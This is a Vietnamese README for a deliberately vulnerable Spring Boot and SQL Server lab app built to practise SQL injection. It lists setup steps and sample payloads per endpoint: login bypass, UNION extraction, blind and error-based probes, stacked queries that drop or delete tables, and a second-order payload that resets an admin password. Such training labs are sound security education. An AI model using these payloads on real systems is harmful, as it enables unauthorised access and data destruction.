# SQL Injection Demo Project

## Giới thiệu
Dự án này là một ứng dụng Spring Boot Web được thiết kế để mô phỏng các lỗ hổng SQL Injection phục vụ mục đích học tập, nghiên cứu và kiểm thử bảo mật. Ứng dụng cung cấp các giao diện và API chứa các lỗ hổng SQL Injection phổ biến để người dùng thực hành khai thác và tìm hiểu cách phòng chống.

## Công nghệ sử dụng
- **Ngôn ngữ**: Java 21
- **Framework**: Spring Boot 3.2.0
- **Cơ sở dữ liệu**: Microsoft SQL Server (MSSQL)
- **Build Tool**: Maven
- **Giao diện**: Thymeleaf

## Cài đặt và Chạy ứng dụng

### 1. Yêu cầu hệ thống
- Java Development Kit (JDK) 21
- Apache Maven 3.9.x
- Microsoft SQL Server (đang chạy và có thể kết nối)

### 2. Cấu hình Cơ sở dữ liệu
1. Mở SQL Server Management Studio (SSMS) hoặc công cụ quản lý DB tương tự.
2. Chạy file script `SQL-Injection-queryDB.sql` (nằm trong thư mục gốc của dự án) để khởi tạo database `UserDB`, các bảng và dữ liệu mẫu.
3. Kiểm tra file `src/main/resources/application.properties` để đảm bảo thông tin kết nối khớp với cấu hình SQL Server của bạn:
   ```properties
   spring.datasource.url=jdbc:sqlserver://localhost:1433;databaseName=UserDB;encrypt=true;trustServerCertificate=true
   spring.datasource.username=sa
   spring.datasource.password=1234
   ```

### 3. Chạy ứng dụng
Mở terminal tại thư mục gốc của dự án và chạy các lệnh sau:

```bash
# Clean và build dự án
mvn clean package

# Chạy ứng dụng
mvn spring-boot:run
```

Sau khi khởi động thành công, truy cập ứng dụng tại: `http://localhost:8080`

## Các kịch bản tấn công (Payloads)

Dưới đây là danh sách các payload mẫu để kiểm thử các lỗ hổng SQL Injection trên ứng dụng.

### 1. Classic SQL Injection (Login Bypass)
**Endpoint**: `/classic` (Form Login)

*   Bypass xác thực cơ bản:
    *   `' OR '1'='1' --`
    *   `user1' OR '1'='1`
*   Xóa dữ liệu (Nguy hiểm):
    *   `'; DROP TABLE UserLogin1; --`
*   Khai thác thông tin (UNION):
    *   `' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'UserLogin1' --`
    *   `' UNION SELECT @@VERSION --`
*   Time-based:
    *   `'; WAITFOR DELAY '00:00:05' --`

### 2. UNION-Based SQL Injection
**Endpoint**: `/union`

*   Kiểm tra số cột và hiển thị dữ liệu:
    *   `' OR '1'='1' --`
    *   `' UNION SELECT @@VERSION --`
    *   `' UNION SELECT table_name FROM information_schema.tables --`
    *   `' UNION SELECT Username FROM UserLogin1 --`
    *   `' UNION ALL SELECT Username FROM UserLogin1 --`

### 3. Blind SQL Injection (Time-based & Boolean-based)
**Endpoint**: `/blind-time`

*   Boolean-based (Kiểm tra đúng/sai):
    *   `1=1 AND 1=1` (True)
    *   `1=1 AND 1=2` (False)
*   Time-based (Kiểm tra độ trễ):
    *   `' WAITFOR DELAY '0:0:5' --`
    *   `' OR 1=1 WAITFOR DELAY '00:00:05' --`

### 4. Error-Based SQL Injection
**Endpoint**: `/error`

*   Gây lỗi để lộ thông tin:
    *   `' UNION SELECT 1/0 --`
    *   `' UNION SELECT CAST('abc' AS INT) --`
    *   `' UNION SELECT CONVERT(INT, 'abc') --`

### 5. Stacked Queries (Thực thi nhiều câu lệnh)
**Endpoint**: `/stacked`

*   Chèn, sửa, xóa dữ liệu:
    *   `admin'; INSERT INTO Logs (Message) VALUES ('SQL Injection Success!'); --`
    *   `'; UPDATE UserLogin1 SET Role='admin' WHERE Username='user1' --`
    *   `'; DELETE FROM UserLogin1 --`

### 6. Second Order SQL Injection
**Endpoint**: `/update-bio` (Cập nhật Bio độc hại) và `/view-bio` (Kích hoạt)

*   **Bước 1**: Cập nhật Bio chứa payload (JSON Body):
    ```json
    {
        "username": "admin",
        "bio": "'; UPDATE UserLogin2 SET Password = 'hacked' WHERE Username = 'admin'; --"
    }
    ```
*   **Bước 2**: Xem Bio để kích hoạt payload.

